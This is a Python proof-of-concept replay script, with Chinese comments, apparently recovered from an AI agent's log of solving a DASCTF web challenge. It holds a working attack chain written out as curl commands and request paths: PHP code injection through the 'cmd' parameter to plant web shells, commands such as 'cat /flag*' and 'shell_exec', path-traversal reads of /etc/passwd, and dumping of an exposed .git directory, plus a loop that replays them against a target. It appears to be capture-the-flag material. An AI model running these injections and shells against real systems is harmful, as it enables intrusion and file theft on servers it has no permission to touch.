#!/usr/bin/env python3
"""从 Muteki Worker 的 CLI 对话原文恢复出的 PoC 脚本。

来源：muteki/evidence/cli-conversations/20261011T145840-001-claude-cli-dbec0774-e470-414f-9e38-7330e5a506d1-.log

⚠️ 本管线未自动执行验证。以下请求是 Worker 解题时真实发出过的，逐条从对话原文转录而来；
本包没有重新执行过它们，因此包内没有任何"已复现确认"的结论。

若某个请求的参数在捕获时仍是 shell 变量，会在步骤中标记为「未解析」，
脚本会跳过该步骤，需人工补齐后才能完整跑通。
每一步都保留了原始 shell 命令作为注释，转录过程不丢信息。

用法：
    export TARGET_URL='http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com'
    python reproduce.py
"""

from __future__ import annotations

import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

TARGET_URL = os.environ.get("TARGET_URL", "").strip().rstrip("/")
FLAG_PATTERN = re.compile(os.environ.get("FLAG_PATTERN", r"DASCTF\{[^}]+\}"), re.I)

# 每步字段：顺序、方法、路径、查询参数、请求体、请求头、未解析项、原始命令
STEPS = [
  {
    "order": 1,
    "method": "GET",
    "path": "/",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "curl -si http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/ | head -60"
  },
  {
    "order": 2,
    "method": "GET",
    "path": "/$NAME?c=id;ls+/;cat+/flag*",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/$NAME?c=id;ls+/;cat+/flag*"
    ],
    "raw_command": "NAME=$(curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=%27%2C%5D%3Bsystem(%24_GET%5B%27c%27%5D)%3B%2F%2F\" | grep -oP '(?<=string\\(36\\) \")[0-9a-f]{32}\\.php'); echo NAME=$NAME; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$NAME?c=id;ls+/;cat+/flag*\" "
  },
  {
    "order": 3,
    "method": "GET",
    "path": "/abdb198c36bc10d68ca11c17f77a2693.php?c=id",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/abdb198c36bc10d68ca11c17f77a2693.php?c=id\" ; echo ===; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/abdb198c36bc10d68ca11c17f77a2693.php\" | head -5"
  },
  {
    "order": 4,
    "method": "GET",
    "path": "/abdb198c36bc10d68ca11c17f77a2693.php",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/abdb198c36bc10d68ca11c17f77a2693.php?c=id\" ; echo ===; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/abdb198c36bc10d68ca11c17f77a2693.php\" | head -5"
  },
  {
    "order": 5,
    "method": "GET",
    "path": "/?cmd=x",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "curl -si \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/abdb198c36bc10d68ca11c17f77a2693.php?c=id\" | head -20; echo ====; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=x\" | tail -2"
  },
  {
    "order": 6,
    "method": "GET",
    "path": "/abdb198c36bc10d68ca11c17f77a2693.php?c=file_put_contents('o.txt','HELLO'.shell_exec('id'));",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/abdb198c36bc10d68ca11c17f77a2693.php?c=file_put_contents('o.txt','HELLO'.shell_exec('id'));\" && curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/o.txt\"; echo; ls /home/kali/workspace"
  },
  {
    "order": 7,
    "method": "GET",
    "path": "/o.txt",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/abdb198c36bc10d68ca11c17f77a2693.php?c=file_put_contents('o.txt','HELLO'.shell_exec('id'));\" && curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/o.txt\"; echo; ls /home/kali/workspace"
  },
  {
    "order": 8,
    "method": "GET",
    "path": "/$NAME?c=id;ls+-la+/;ls+-la+/var/www/html",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/$NAME?c=id;ls+-la+/;ls+-la+/var/www/html"
    ],
    "raw_command": "CMD=\"', 'a'=>shell_exec(\\$_GET['c']).'\"; ENC=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\" \"$CMD\"); NAME=$(curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=$ENC\" | grep -oP '(?<=string\\(36\\) \")[0-9a-f]{32}\\.php'); echo NAME=$NAME; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$NAME?c=id;ls+-la+/;ls+-la+/var/www/html\""
  },
  {
    "order": 9,
    "method": "GET",
    "path": "/$NAME?c=id",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/$NAME?c=id"
    ],
    "raw_command": "CMD=\"', 'a'=>file_get_contents('index.php').'\"; ENC=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\" \"$CMD\"); NAME=$(curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=$ENC\" | grep -oP '(?<=string\\(36\\) \")[0-9a-f]{32}\\.php'); echo NAME=$NAME; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$NAME?c=id\" | head -40; echo ===; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$NAME?c=\" | head -5"
  },
  {
    "order": 10,
    "method": "GET",
    "path": "/$NAME?c=",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/$NAME?c="
    ],
    "raw_command": "CMD=\"', 'a'=>file_get_contents('index.php').'\"; ENC=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\" \"$CMD\"); NAME=$(curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=$ENC\" | grep -oP '(?<=string\\(36\\) \")[0-9a-f]{32}\\.php'); echo NAME=$NAME; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$NAME?c=id\" | head -40; echo ===; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$NAME?c=\" | head -5"
  },
  {
    "order": 11,
    "method": "GET",
    "path": "/$NAME?c=id;ls+-la+/;/;ls+-la+/var/www/html",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/$NAME?c=id;ls+-la+/;/;ls+-la+/var/www/html"
    ],
    "raw_command": "CMD=\"', 'a'=>var_dump(shell_exec(\\$_GET['c'])).'\"; ENC=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))\" \"$CMD\"); NAME=$(curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=$ENC\" | grep -oP '(?<=string\\(36\\) \")[0-9a-f]{32}\\.php'); echo NAME=$NAME; curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$NAME?c=id;ls+-la+/;/;ls+-la+/var/www/html\" | head -60"
  },
  {
    "order": 12,
    "method": "GET",
    "path": "/1c2bd40597842d6e679da0906772c22f.php?c=cat+/flaaaaaaaaaaaaaaaaag",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "curl -s \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/1c2bd40597842d6e679da0906772c22f.php?c=cat+/flaaaaaaaaaaaaaaaaag\""
  },
  {
    "order": 13,
    "method": "GET",
    "path": "/ea20bea38dcd3ce4d190045637617ee6.php",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 --cookie-jar /tmp/recon.cookies --cookie /tmp/recon.cookies 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/ea20bea38dcd3ce4d190045637617ee6.php'\""
  },
  {
    "order": 14,
    "method": "OPTIONS",
    "path": "/",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 -X OPTIONS 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/'; curl -sS -i --max-time 20 -X TRACE 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/'\""
  },
  {
    "order": 15,
    "method": "TRACE",
    "path": "/",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 -X OPTIONS 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/'; curl -sS -i --max-time 20 -X TRACE 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/'\""
  },
  {
    "order": 16,
    "method": "GET",
    "path": "/4351919c8088b2b3b3b74ddc9516fa95.php?cmd=id",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 --cookie-jar /tmp/recon.cookies --cookie /tmp/recon.cookies 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/4351919c8088b2b3b3b74ddc9516fa95.php?cmd=id'\""
  },
  {
    "order": 17,
    "method": "GET",
    "path": "/.git/",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/info/refs?service=git-upload-pack'\""
  },
  {
    "order": 18,
    "method": "GET",
    "path": "/.git/info/refs?service=git-upload-pack",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/info/refs?service=git-upload-pack'\""
  },
  {
    "order": 19,
    "method": "GET",
    "path": "/.git/objects/",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/objects/' | sed -n '1,240p'; printf '%s\\\\n' '--- info ---'; curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/info/' | sed -n '1,240p'; printf '%s\\\\n' '--- refs listing ---'; curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/refs/' | sed -n '1,240p'\""
  },
  {
    "order": 20,
    "method": "GET",
    "path": "/.git/info/",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/objects/' | sed -n '1,240p'; printf '%s\\\\n' '--- info ---'; curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/info/' | sed -n '1,240p'; printf '%s\\\\n' '--- refs listing ---'; curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/refs/' | sed -n '1,240p'\""
  },
  {
    "order": 21,
    "method": "GET",
    "path": "/.git/refs/",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/objects/' | sed -n '1,240p'; printf '%s\\\\n' '--- info ---'; curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/info/' | sed -n '1,240p'; printf '%s\\\\n' '--- refs listing ---'; curl -sS --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/refs/' | sed -n '1,240p'\""
  },
  {
    "order": 22,
    "method": "GET",
    "path": "/?C=N;O=D",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"printf '%s\\\\n' 'root listing'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?C=N;O=D' | sed -n '1,220p'; printf '%s\\\\n' 'common backups'; for p in 'index.php~' 'index.php.bak' 'index.php.save' 'index.php.swp' '.index.php.swp' 'static/secretkey.txt.bak' 'static/secretkey.txt~'; do code=\"'$(curl -sS -o /tmp/recon-backup -w '\"'%{http_code} %{size_download} %{content_type}' --max-time 10 \\\"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/\"'$p\"); printf '\"'%-28s %s\\\\n' \\\"/\"'$p\" \"$code\"; done'"
  },
  {
    "order": 23,
    "method": "GET",
    "path": "/%2e%2e/%2e%2e/etc/passwd",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/%2e%2e/%2e%2e/etc/passwd'; curl -sS -i --path-as-is --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/static/secretkey.txt/../../../../etc/passwd'; curl -sS -i --path-as-is --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/../../../../etc/passwd'\""
  },
  {
    "order": 24,
    "method": "GET",
    "path": "/static/secretkey.txt/../../../../etc/passwd",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/%2e%2e/%2e%2e/etc/passwd'; curl -sS -i --path-as-is --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/static/secretkey.txt/../../../../etc/passwd'; curl -sS -i --path-as-is --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/../../../../etc/passwd'\""
  },
  {
    "order": 25,
    "method": "GET",
    "path": "/.git/../../../../etc/passwd",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/%2e%2e/%2e%2e/etc/passwd'; curl -sS -i --path-as-is --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/static/secretkey.txt/../../../../etc/passwd'; curl -sS -i --path-as-is --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/../../../../etc/passwd'\""
  },
  {
    "order": 26,
    "method": "GET",
    "path": "/$p",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/$p"
    ],
    "raw_command": "/bin/bash -c \"for p in '.git/hooks/' '.git/objects/info/' '.git/refs/heads/' '.git/refs/tags/' '.git/branches/'; do printf '%s\\\\n' \\\"--- \"'$p\"; curl -sS --max-time 10 \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$p\" | sed -n '\"'1,180p'; done\""
  },
  {
    "order": 27,
    "method": "GET",
    "path": "/.git/objects/${sha:0:2}/${sha:2}",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/.git/objects/${sha:0:2}/${sha:2}"
    ],
    "raw_command": "/bin/bash -c \"python3 - <<'PY'\nimport urllib.request,zlib,hashlib,pathlib\nbase='http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/objects/'\n# index shas from parse output\nfor sha in []: pass\nPY\nfor sha in 09f609b7163a69d9538b2e64e806b25c9782b055 3ea8c4e85d44ecf3a1c1684f0c5044e01709c61f 6a27de374c0e214d1296e7efcb9248afbda4144f 7b456b0125e74b44d1147182019c704c53132013 8ac4f76df2ce8db696d75f5f146f4047a315af22 15ca375e54f056a576905b41a417b413c57df6eb; do printf '%s ' \\\"\"'$sha\"; curl -sS -o /tmp/x -w '\"'%{http_code} %{size_download}\\\\n' --max-time 10 \\\"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/.git/objects/\"'${sha:0:2}/${sha:2}\"; done'"
  },
  {
    "order": 28,
    "method": "GET",
    "path": "/server-status?auto",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/server-status?auto'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/server-info'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/static/secretkey.txt'\""
  },
  {
    "order": 29,
    "method": "GET",
    "path": "/server-info",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/server-status?auto'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/server-info'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/static/secretkey.txt'\""
  },
  {
    "order": 30,
    "method": "GET",
    "path": "/static/secretkey.txt",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -c \"curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/server-status?auto'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/server-info'; curl -sS -i --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/static/secretkey.txt'\""
  },
  {
    "order": 31,
    "method": "GET",
    "path": "/?cmd=test",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -lc \"cd /home/kali/workspace && curl -s --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=test' | tail -5\""
  },
  {
    "order": 32,
    "method": "GET",
    "path": "/?cmd=%27%5D%3B%20phpinfo()%3B%20%2F%2A",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [],
    "raw_command": "/bin/bash -lc \"cd /home/kali/workspace && curl -s --max-time 20 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/?cmd=%27%5D%3B%20phpinfo()%3B%20%2F%2A' | tail -5\""
  },
  {
    "order": 33,
    "method": "GET",
    "path": "/$fn",
    "query": [],
    "body": [],
    "headers": {},
    "unresolved": [
      "path=/$fn"
    ],
    "raw_command": "/bin/bash -lc 'cd /home/kali/workspace && resp=$(curl -s --max-time 20 --get --data-urlencode \"cmd='\"'];system('id');/*\\\" 'http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/'); echo \\\"\"'$resp\" | tail -3; fn=$(printf '\"'%s' \\\"\"'$resp\" | rg -o '\"'[0-9a-f]{32}\\\\.php' | tail -1); echo \\\"FILE=\"'$fn\"; printf '\"'%s' \\\"\"'$resp\" > evidence/writeshell_gen_1.txt; curl -s -i --max-time 20 \"http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/$fn\" | tee evidence/writeshell_exec_1.txt | head -40'"
  }
]


def build_url(step):
    """把路径与查询参数拼成完整 URL。"""
    url = TARGET_URL + step["path"]
    query = [(key, value) for key, value in step["query"]]
    if query:
        url += ("&" if "?" in url else "?") + urllib.parse.urlencode(query)
    return url


def main():
    if not TARGET_URL:
        print("缺少 TARGET_URL，例如："
              "TARGET_URL='http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com' python reproduce.py")
        return 2

    print("提示：以下为对话转录重放，不是本管线执行过的验证。")
    results = []
    for step in STEPS:
        order = step["order"]
        if step["unresolved"]:
            print(f"[{order}] 已跳过（参数未解析）：{step['unresolved']}")
            print(f"       原始命令：{step['raw_command'][:300]}")
            results.append({"order": order, "ok": False, "status": None,
                           "skipped": "参数未解析"})
            continue

        url = build_url(step)
        method = step["method"]
        data = None
        headers = dict(step["headers"])
        if step["body"]:
            data = urllib.parse.urlencode(step["body"]).encode("utf-8")
            headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        request = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=20) as response:
                raw, status = response.read(), int(response.status)
        except urllib.error.HTTPError as error:
            raw, status = error.read(), int(error.code)
        except Exception as error:  # noqa: BLE001 - 记录异常，不中断整体重放
            print(f"[{order}] {method} {url} -> 异常 {type(error).__name__}")
            results.append({"order": order, "ok": False, "status": None})
            continue

        text = raw.decode("utf-8", errors="replace")
        flags = list(dict.fromkeys(FLAG_PATTERN.findall(text)))
        print(f"[{order}] {method} {url} -> HTTP {status}（{len(raw)} 字节）")
        for flag in flags:
            print(f"       命中 Flag：{flag}")
        results.append({"order": order, "ok": status < 400, "status": status,
                       "flag_matches": flags[:10]})

    print(json.dumps({"ok": all(item.get("ok") for item in results),
                      "steps": results}, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
